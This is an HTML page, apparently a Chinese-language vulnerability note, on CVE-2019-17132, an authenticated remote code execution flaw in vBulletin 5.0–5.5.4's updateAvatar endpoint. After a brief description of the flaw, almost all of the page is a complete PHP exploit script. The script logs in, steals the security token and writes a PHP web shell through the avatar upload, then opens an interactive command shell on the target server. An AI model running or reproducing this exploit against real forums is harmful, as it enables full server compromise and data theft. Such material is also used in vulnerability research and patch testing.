<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xbc0a03abfa0ed1039be1f70e2a4ba270e4657ff"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-17132</span><span class="csECDA2D3">）</span><span class="csDE05BCC">vBulletin 5.0 &lt;5.5.4-&#39;updateAvatar&#39;</span><span class="csECDA2D3">身份验证的远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">用户输入更新头像的的时候，前未正确验证提交的</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">数据</span><span class="cs8926E06">[</span><span class="cs9C1B1871">扩展</span><span class="cs8926E06">]&rdquo;</span><span class="cs9C1B1871">和</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">数据</span><span class="cs8926E06">[</span><span class="cs9C1B1871">文件数据</span><span class="cs8926E06">]&rdquo;</span><span class="cs9C1B1871">参数就发送到了</span><span class="cs8926E06">&ldquo; ajax / api / user / updateavatar&rdquo;</span><span class="cs9C1B1871">，导致此突破的产生</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用此突破可以插入和执行任意</span><span class="cs8926E06">php</span><span class="cs9C1B1871">代码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">成功利用此突破需要</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">将头像另存为</span><span class="cs8926E06">Files</span><span class="cs9C1B1871">（头像保存为文件）</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">选项要启用（可选情况下少量）。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;---------------------------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;vBulletin &lt;= 5.5.4 (updateAvatar) </span><span class="cs7FFD2630">远程代码执行漏洞</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;---------------------------------------------------------------------</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">set_time_limit(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">error_reporting(E_ERROR);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if (!extension_loaded(&quot;curl&quot;)) die(&quot;[-] cURL extension required!\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print &quot;+-------------------------------------------------------------------------+&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print &quot;\n| vBulletin &lt;= 5.5.4 (updateAvatar) Remote Code Execution Exploit by EgiX |&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print &quot;\n+-------------------------------------------------------------------------+\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if ($argc != 4)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\nUsage......: php $argv[0] &lt;URL&gt; &lt;Username&gt; &lt;Password&gt;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\nExample....: php $argv[0] http://localhost/vb/ user passwd&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\nExample....: php $argv[0] [url]https://vbulletin.com/[/url] evil hacker\n\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$ch = curl_init();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_HEADER, true);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print &quot;\n[-] Logging in with username &#39;{$user}&#39; and password &#39;{$pass}&#39;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_URL, $url);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if (!preg_match(&quot;/Cookie: .*sessionhash=[^;]+/&quot;, curl_exec($ch), $sid)) die(&quot;[-] Session ID not found!\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_URL, &quot;{$url}?routestring=auth/login&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_HTTPHEADER, $sid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_POSTFIELDS, &quot;username={$user}&amp;password={$pass}&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if (!preg_match(&quot;/Cookie: .*sessionhash=[^;]+/&quot;, curl_exec($ch), $sid)) die(&quot;[-] Login failed!\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print &quot;[-] Logged-in! Retrieving security token...\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_URL, $url);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_POST, false);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_HTTPHEADER, $sid);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if (!preg_match(&#39;/token&quot;: &quot;([^&quot;]+)&quot;/&#39;, curl_exec($ch), $token)) die(&quot;[-] Security token not found!\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print &quot;[-] Uploading new avatar...\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$params = [&quot;profilePhotoFile&quot; =&gt; new CURLFile(&quot;avatar.jpeg&quot;), &quot;securitytoken&quot; =&gt; $token[1]];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_URL, &quot;{$url}?routestring=profile/upload-profilepicture&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_HEADER, false);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if (($path = (json_decode(curl_exec($ch)))-&gt;avatarpath) == null) die(&quot;[-] Upload failed!\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if (preg_match(&#39;/image\.php\?/&#39;, $path)) die(&quot;[-] Sorry, the &#39;Save Avatars as Files&#39; option is disabled!\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print &quot;[-] Updating avatar with PHP shell...\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$php_code = &#39;&lt;?php print(&quot;____&quot;); passthru(base64_decode($_SERVER[&quot;HTTP_CMD&quot;])); ?&gt;&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$params = [&quot;routestring&quot; =&gt; &quot;ajax/api/user/updateAvatar&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;userid&quot; =&gt; 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;avatarid&quot; =&gt; 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;data[extension]&quot; =&gt; &quot;php&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;data[filedata]&quot; =&gt; $php_code,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;securitytoken&quot; =&gt; $token[1]];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_URL, $url);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if (curl_exec($ch) !== &quot;true&quot;) die(&quot;[-] Update failed!\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print &quot;[-] </span><span class="cs7FFD2630">上传</span><span class="cs9FB05234">shell</span><span class="cs7FFD2630">中</span><span class="cs9FB05234">...\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">preg_match(&#39;/(\d+)\.jpeg/&#39;, $path, $m);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$path = preg_replace(&#39;/(\d+)\.jpeg/&#39;, ($m[1]+1).&quot;.php&quot;, $path);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_URL, &quot;{$url}core/{$path}&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl_setopt($ch, CURLOPT_POST, false);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">while(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;\nvb-shell# &quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (($cmd = trim(fgets(STDIN))) == &quot;exit&quot;) break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;curl_setopt($ch, CURLOPT_HTTPHEADER, [&quot;CMD: &quot;.base64_encode($cmd)]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;preg_match(&#39;/____(.*)/s&#39;, curl_exec($ch), $m) ? print $m[1] : die(&quot;\n[-] Exploit failed!\n&quot;);</span></p></body>
</html>
